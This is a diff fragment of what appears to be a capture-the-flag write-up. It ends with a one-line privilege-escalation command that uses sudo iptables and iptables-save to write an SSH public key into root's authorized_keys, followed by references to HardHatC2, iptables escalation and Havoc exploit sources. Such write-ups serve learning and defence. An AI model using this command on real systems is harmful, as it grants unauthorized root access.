@@ -274,8 +274,25 @@ print(r.text)
 sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n[public-key]\n';sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
 ```
 
+- Root
 
+![image](https://github.com/user-attachments/assets/991da75d-66d0-4f97-9c56-ff8b7ea12e74)
 
+------------
+
+### THANKS FOR READING!!!
+
+-------------
+
+### REFERENCES-:
+
+-------------
+
+- [HardHatc2 zerodays](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7)
+- [Iptables privilege escalation](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/)
+- [Havoc SSRF-to-RCE](https://github.com/kit4py/CVE-2024-41570)
+
+---------------
 
 
 
